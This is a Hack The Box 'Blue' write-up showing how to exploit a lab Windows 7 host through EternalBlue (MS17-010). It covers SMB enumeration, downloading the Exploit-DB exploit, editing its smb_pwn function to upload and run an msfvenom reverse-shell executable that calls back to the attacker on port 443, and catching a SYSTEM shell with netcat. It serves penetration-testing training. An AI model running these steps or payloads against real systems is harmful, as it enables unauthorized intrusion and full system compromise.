---
layout: post
title:  "Hack The Box - Blue - Writeup"
date:   2022-01-22 07:00:00 +0200
#mainTags: ["Hack The Box","OSCP"]
tags: ["CVE-2017-0144","EternalBlue","Exploit-DB","Hack The Box","Hack The Box - Easy","Hack The Box - Windows","Msfvenom","OSCP","Python2","SMB"]
---
{% assign imgDir="2022-01-22-HTB-Blue-Writeup" %}

# Introduction
The hack the box machine "Blue" is an easy machine which could be considered as one of the simplest machines on hack the box. Exploiting this machine only requires knowledge about [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue), a dangerous exploit which has been utilized in various ransomwares after being leaked by the hacker group [Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers).

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.40`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that ports corresponding to SMB and Microsoft RPC are open.

![nmap](/assets/{{ imgDir }}/nmap.png)

One of the first things to do when discovering that SMB is available, is to enumerate SMB shares. This can be performed using nmap's scripting engine by executing `nmap 10.10.10.40 -p 139,445 --script=smb-enum*`, as demonstrated below. Note that the `-p` flag is used to specify that we only want to interact with the SMB ports and that the `--script` flag is used to specify what scripts to execute. In our case, we specify that all scripts starting with the string `smb-enum` should be used.

{% highlight none linenos %}
kali@kali:/tmp/x$ @@nmap 10.10.10.40 -p 139,445 --script=smb-enum*@@
[...]
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.40\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.40\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.40\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   @@@\\10.10.10.40\Share:@@@
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|     @@@Current user access: READ@@@
|   @@@\\10.10.10.40\Users:@@@
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    @@@Current user access: READ@@@

Nmap done: 1 IP address (1 host up) scanned in 46.91 seconds
kali@kali:/tmp/x$
{% endhighlight %}

From the output of the command, we can see that we have access to 5 different shares. The names of default shares always end with the `$` character and are usually not interesting for us as attackers. The other two, however, might contain interesting information. We can check what files they contain using smbclient as demonstrated below. However, they do not appear to contain anything useful.

{% highlight none linenos %}
kali@kali:/tmp/x$ @@smbclient '\\10.10.10.40\Share' --no-pass@@
lpcfg_do_global_parameter: WARNING: The "client lanman auth" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
Try "help" to get a list of possible commands.
smb: \> @@ls@@
  .                                   D        0  Fri Jul 14 09:48:44 2017
  ..                                  D        0  Fri Jul 14 09:48:44 2017

                8362495 blocks of size 4096. 4212361 blocks available
smb: \> @@exit@@
kali@kali:/tmp/x$ @@smbclient '\\10.10.10.40\Users' --no-pass@@
lpcfg_do_global_parameter: WARNING: The "client lanman auth" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
Try "help" to get a list of possible commands.
smb: \> @@ls@@
  .                                  DR        0  Fri Jul 21 02:56:23 2017
  ..                                 DR        0  Fri Jul 21 02:56:23 2017
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Public                             DR        0  Tue Apr 12 03:51:29 2011

                8362495 blocks of size 4096. 4212361 blocks available
smb: \> @@ls Public@@
  Public                             DR        0  Tue Apr 12 03:51:29 2011

                8362495 blocks of size 4096. 4212361 blocks available
smb: \> @@exit@@
kali@kali:/tmp/x$
{% endhighlight %}

Another thing to check for when pentesting SMB, is SMB related vulnerabilites. This can be performed using nmap by executing `nmap 10.10.10.40 -p 139,445 --script=smb-vuln*`, as demonstrated below.

{% highlight none linenos %}
kali@kali:/tmp/x$ @@nmap 10.10.10.40 -p 139,445 --script=smb-vuln*@@
[...]
Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| @@@smb-vuln-ms17-010:@@@ 
|   @@@VULNERABLE:@@@
|   @@@Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)@@@
|     @@@State: VULNERABLE@@@
|     @@@IDs:  CVE:CVE-2017-0143@@@
|     @@@Risk factor: HIGH@@@
|       @@@A critical remote code execution vulnerability exists in Microsoft SMBv1@@@
|        @@@servers (ms17-010).@@@
|           
|     @@@Disclosure date: 2017-03-14@@@
|     @@@References:@@@
|       @@@https://technet.microsoft.com/en-us/library/security/ms17-010.aspx@@@
|       @@@https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143@@@
|_      @@@https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/@@@

Nmap done: 1 IP address (1 host up) scanned in 14.01 seconds
kali@kali:/tmp/x$
{% endhighlight %}

From the output of the command, we can see that nmap discovers that the host is vulnerable to [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/cve-2017-0144) which is the famous [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) vulnerability. The next step is to locate an exploit for this vulnerability. A good source for finding exploits is [ExploitDB](https://www.exploit-db.com/). If we search on google for exploits related to EternalBlue and ExploitDB, we can find a [relevant exploit](https://www.exploit-db.com/exploits/42315), as can be seen below.

![google](/assets/{{ imgDir }}/google.png)

{% highlight none linenos %}
kali@kali:/tmp/x$ @@wget https://www.exploit-db.com/raw/42315 -O 42315.py@@
[...]
Saving to: ‘42315.py’

42315.py                         [  <=>                                        ]  40.98K   150KB/s    in 0.3s    

2021-12-11 10:30:13 (150 KB/s) - @@@‘42315.py’ saved [41968]@@@

kali@kali:/tmp/x$
{% endhighlight %}

We can download this exploit by executing `wget https://www.exploit-db.com/raw/42315 -O 42315.py`, as shown above.

<div id="USERNAME"></div>
{% highlight python linenos %}
#!/usr/bin/python
from impacket import smb, smbconnection
from mysmb import MYSMB
from struct import pack, unpack, unpack_from
import sys
import socket
import time

'''
MS17-010 exploit for Windows 2000 and later by sleepya

EDB Note: mysmb.py can be found here ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin>

Note:
- The exploit should never crash a target (chance should be nearly 0%)
- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed

Tested on:
- Windows 2016 x64
- Windows 10 Pro Build 10240 x64
- Windows 2012 R2 x64
- Windows 8.1 x64
- Windows 2008 R2 SP1 x64
- Windows 7 SP1 x64
- Windows 2008 SP1 x64
- Windows 2003 R2 SP2 x64
- Windows XP SP2 x64
- Windows 8.1 x86
- Windows 7 SP1 x86
- Windows 2008 SP1 x86
- Windows 2003 SP2 x86
- Windows XP SP3 x86
- Windows 2000 SP4 x86
'''

USERNAME = ''
PASSWORD = ''
{% endhighlight %}

At the top of the exploit script, we can find some comments which include a link to a script named "mysmb.py". This script is needed for the exploit to work and can also be downloaded with `wget` as shown below. Note that an empty username and password is set using the `USERNAME` and `PASSWORD` variables. Sometimes, these aren't required since the target might be configured to allow [null sessions](https://www.blumira.com/glossary/null-session/).

{% highlight none linenos %}
kali@kali:/tmp/x$ @@wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py -O mysmb.py@@
[...]
Saving to: ‘mysmb.py’

mysmb.py                     100%[============================================>]  16.28K  --.-KB/s    in 0s      

2021-12-11 10:41:57 (58.1 MB/s) - @@@‘mysmb.py’ saved@@@ [16669/16669]

kali@kali:/tmp/x$
{% endhighlight %}

The exploit expects a target IP as a command line argument. Then, it exploits the target and executes the code in its `smb_pwn` function shown below.

{% highlight python linenos %}
def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()
	
	print('creating file c:\\pwned.txt on the target')
	tid2 = smbConn.connectTree('C$')
	fid2 = smbConn.createFile(tid2, '/pwned.txt')
	smbConn.closeFile(tid2, fid2)
	smbConn.disconnectTree(tid2)
	
	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
	# Note: there are many methods to get shell over SMB admin session
	# a simple method to get shell (but easily to be detected by AV) is
	# executing binary generated by "msfvenom -f exe-service ..."
{% endhighlight %}

We can change the content of this function to upload and execute a reverse shell payload as demonstrated below. This code uploads and executes a file named "rs.exe". The next step is to generate this file.

{% highlight python linenos %}
def smb_pwn(conn, arch):
    smbConn = conn.get_smbconnection()
    smb_send_file(smbConn, './rs.exe', 'C', '/rs.exe')
    service_exec(conn, r'cmd /c C:\rs.exe')
{% endhighlight %}

A reverse shell executable can be generated with [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) by executing `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f exe -o rs.exe`. The `-p` flag selects the payload `windows/shell_reverse_tcp` which is a payload that connects back to us on a specific port, providing us with a shell. This payload is stageless and we can thus simply listen for a connection using a netcat listener. The `LHOST` and `LPORT` parameters specifiy our IP address and the port we want the target to connect to. In our case, we choose port 443 since it is usually used for HTTPS traffic and thus traffic to this port might look less suspicious than a random port. Finally, the `-f` flag is used to specify that we want to output the payload as a [Portable Excecutable](https://en.wikipedia.org/wiki/Portable_Executable) and the `-o` flag specifies the output file `rs.exe`.
 
{% highlight none linenos %}
kali@kali:/tmp/x$ @@msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f exe -o rs.exe@@
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
@@@Saved as: rs.exe@@@
kali@kali:/tmp/x$
{% endhighlight %}

Next, we start a netcat listener by executing `nc -lvnp 443`. Then, we launch the exploit by executing `python 42315.py 10.10.10.40`. Note that we use `python` instead of `python3` since this exploit was written in python2 and not python3.  

{% highlight none linenos %}
kali@kali:/tmp/x$ @@python 42315.py 10.10.10.40@@
Target OS: Windows 7 Professional 7601 Service Pack 1
@@@Not found accessible named pipe@@@
Done
kali@kali:/tmp/x$
{% endhighlight %}

As can be seen above, the exploit fails to find a named pipe. We can try to add more named pipes to the script since it has a hard coded list of named pipes to try. Another alternative is to provide the exploit with credentials using the two variables named "USERNAME" and "PASSWORD" which we saw [earlier]({{path}}#USERNAME). Some Windows systems allow SMB access for anonymous users using a guest account with a blank password. As such, we could try to change the value of the `USERNAME` parameter as shown below.

{% highlight none linenos %}
USERNAME = '@@@guest@@@'
PASSWORD = ''
{% endhighlight %}

Once we have specified a username in the exploit, we reexecute it.

{% highlight none linenos %}
kali@kali:/tmp/x$ @@python 42315.py 10.10.10.40@@
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: samr
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8001995980
SESSION: 0xfffff8a003d42aa0
FLINK: 0xfffff8a004190088
InParam: 0xfffff8a00418a15c
MID: 0x1e03
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Opening SVCManager on 10.10.10.40.....
Creating service OtIh.....
Starting service OtIh.....
The NETBIOS connection with the remote host timed out.
Removing service OtIh.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
kali@kali:/tmp/x$ 
{% endhighlight %}

![system](/assets/{{ imgDir }}/system.png)

After a couple of seconds, our listener receives a connection from the target and we obtain a shell as `SYSTEM`!
 
